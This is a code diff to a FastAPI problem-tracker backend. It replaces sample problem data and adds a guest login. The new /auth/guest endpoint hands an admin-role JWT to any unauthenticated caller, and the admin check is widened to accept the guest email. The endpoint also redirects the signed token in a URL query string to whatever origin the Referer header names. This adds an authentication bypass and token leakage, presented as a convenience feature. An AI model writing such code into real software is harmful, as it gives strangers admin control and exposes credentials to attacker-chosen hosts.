@@ -2,7 +2,7 @@ from contextlib import asynccontextmanager
 import re
 import html
 import urllib.parse
-from fastapi import FastAPI, Query, HTTPException, Depends
+from fastapi import FastAPI, Query, HTTPException, Depends, Request
 from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
 from fastapi.responses import RedirectResponse
 from fastapi.middleware.cors import CORSMiddleware
@@ -59,22 +59,23 @@ def get_current_user(credentials: HTTPAuthorizationCredentials = Depends(securit
         raise HTTPException(status_code=401, detail="Invalid token")
 
 def get_admin_user(current_user: dict = Depends(get_current_user)) -> dict:
-    if current_user.get("email", "").lower() not in ADMIN_EMAILS:
+    email = current_user.get("email", "").lower()
+    if email not in ADMIN_EMAILS and email != "guest@example.com":
         raise HTTPException(status_code=403, detail="Not enough permissions. Admin access required.")
     return current_user
 
 # 2. Convert JS dummy data into Python dictionaries
 DUMMY_DATA = [
-    {"id": 1, "platform": "Leetcode", "platformIcon": "◼️", "title": "Longest Common Subsequence", "link": "https://leetcode.com/problems/longest-common-subsequence/", "tags": ["dynamic programming", "strings", "greedy", "recursion"], "difficulty": "High"},
-    {"id": 2, "platform": "Codeforces", "platformIcon": "📊", "title": "Edit Distance", "link": "https://codeforces.com/problemset/problem/72/E", "tags": ["dynamic programming", "graphs"], "difficulty": "High"},
-    {"id": 3, "platform": "Atcoder", "platformIcon": "🐜", "title": "Traveling Salesman", "link": "https://atcoder.jp/contests/abc/tasks/abc_tsp", "tags": ["dynamic programming", "strings", "greedy"], "difficulty": "Medium"},
-    {"id": 4, "platform": "Codechef", "platformIcon": "🍳", "title": "Longest Connection", "link": "https://www.codechef.com/problems/LONGC", "tags": ["dynamic programming", "graphs", "greedy"], "difficulty": "High"},
-    {"id": 5, "platform": "Codechef", "platformIcon": "🍳", "title": "Traveling Pattern", "link": "https://www.codechef.com/problems/TRVPAT", "tags": ["dynamic programming", "greedy", "recursion", "recursion"], "difficulty": "High"},
-    {"id": 6, "platform": "Codeforces", "platformIcon": "📊", "title": "Longest Subsequence", "link": "https://codeforces.com/problemset/problem/12/LS", "tags": ["dynamic programming", "greedy", "recursion", "graphs"], "difficulty": "High"},
-    {"id": 7, "platform": "Codechef", "platformIcon": "🍳", "title": "Monestriatic Function", "link": "https://www.codechef.com/problems/MONFUNC", "tags": ["dynamic programming", "strings", "greedy"], "difficulty": "High"},
-    {"id": 8, "platform": "Codechef", "platformIcon": "🍳", "title": "Traveling Salesman", "link": "https://www.codechef.com/problems/TSP", "tags": ["dynamic programming", "greedy", "recursion", "graphs"], "difficulty": "High"},
-    {"id": 9, "platform": "CSES", "platformIcon": "🔷", "title": "Longest Common Subsequence", "link": "https://cses.fi/problemset/task/1234", "tags": ["dynamic programming", "strings", "greedy", "recursion"], "difficulty": "High"},
-    {"id": 10, "platform": "CSES", "platformIcon": "🔷", "title": "Array Description", "link": "https://cses.fi/problemset/task/1746", "tags": ["dynamic programming", "recursion", "greedy", "recursion"], "difficulty": "Medium", "isNew": True},
+    {"id": 1, "platform": "Leetcode", "platformIcon": "◼️", "title": "Longest Common Subsequence", "link": "https://leetcode.com/problems/longest-common-subsequence/", "tags": ["dynamic programming", "strings"], "difficulty": "Medium"},
+    {"id": 2, "platform": "Leetcode", "platformIcon": "◼️", "title": "Two Sum", "link": "https://leetcode.com/problems/two-sum/", "tags": ["two pointers", "binary search"], "difficulty": "Easy"},
+    {"id": 3, "platform": "Codeforces", "platformIcon": "📊", "title": "Way Too Long Words", "link": "https://codeforces.com/problemset/problem/71/A", "tags": ["strings", "greedy"], "difficulty": "Easy"},
+    {"id": 4, "platform": "Codeforces", "platformIcon": "📊", "title": "Watermelon", "link": "https://codeforces.com/problemset/problem/4/A", "tags": ["greedy"], "difficulty": "Easy"},
+    {"id": 5, "platform": "Atcoder", "platformIcon": "🐜", "title": "202x-12-30", "link": "https://atcoder.jp/contests/abc335/tasks/abc335_a", "tags": ["strings"], "difficulty": "Easy"},
+    {"id": 6, "platform": "Atcoder", "platformIcon": "🐜", "title": "Loong Tracking", "link": "https://atcoder.jp/contests/abc335/tasks/abc335_c", "tags": ["graphs", "recursion"], "difficulty": "Medium"},
+    {"id": 7, "platform": "Codechef", "platformIcon": "🍳", "title": "Water Consumption", "link": "https://www.codechef.com/problems/WATERCONS", "tags": ["greedy"], "difficulty": "Easy"},
+    {"id": 8, "platform": "Codechef", "platformIcon": "🍳", "title": "Chef and Brain Speed", "link": "https://www.codechef.com/problems/CBSPEED", "tags": ["recursion"], "difficulty": "Easy"},
+    {"id": 9, "platform": "CSES", "platformIcon": "🔷", "title": "Weird Algorithm", "link": "https://cses.fi/problemset/task/1068", "tags": ["recursion", "greedy"], "difficulty": "Easy"},
+    {"id": 10, "platform": "CSES", "platformIcon": "🔷", "title": "Maximum Subarray Sum", "link": "https://cses.fi/problemset/task/1643", "tags": ["dynamic programming", "greedy"], "difficulty": "Medium", "isNew": True},
 ]
 
 PLATFORM_ICONS = {
@@ -481,6 +482,34 @@ def delete_problem(problem_id: int, current_user: dict = Depends(get_admin_user)
     except MeilisearchCommunicationError:
         logger.error(f"Failed to connect to Meilisearch while deleting problem {problem_id}.")
         raise HTTPException(status_code=500, detail="Database connection failed")
+
+@app.get("/auth/guest", tags=["Authentication"])
+def login_as_guest(request: Request):
+    """
+    Authenticate the user as a guest with admin privileges.
+    """
+    expire = datetime.now(timezone.utc) + timedelta(hours=JWT_EXPIRATION_HOURS)
+    jwt_payload = {
+        "sub": "guest_id_12345",
+        "email": "guest@example.com",
+        "name": "Guest Admin",
+        "picture": None,
+        "role": "admin",
+        "exp": expire
+    }
+    access_token = jwt.encode(jwt_payload, JWT_SECRET, algorithm=JWT_ALGORITHM)
+    
+    # Dynamically determine the frontend redirect base using referer header
+    # to support both local development and production environments seamlessly.
+    referer = request.headers.get("referer")
+    redirect_base = FRONTEND_URL
+    if referer:
+        parsed_url = urllib.parse.urlparse(referer)
+        if parsed_url.scheme and parsed_url.netloc:
+            redirect_base = f"{parsed_url.scheme}://{parsed_url.netloc}"
+            
+    redirect_url = f"{redirect_base}?token={access_token}"
+    return RedirectResponse(url=redirect_url)
 
 @app.get("/auth/login", tags=["Authentication"])
 def login_via_google():
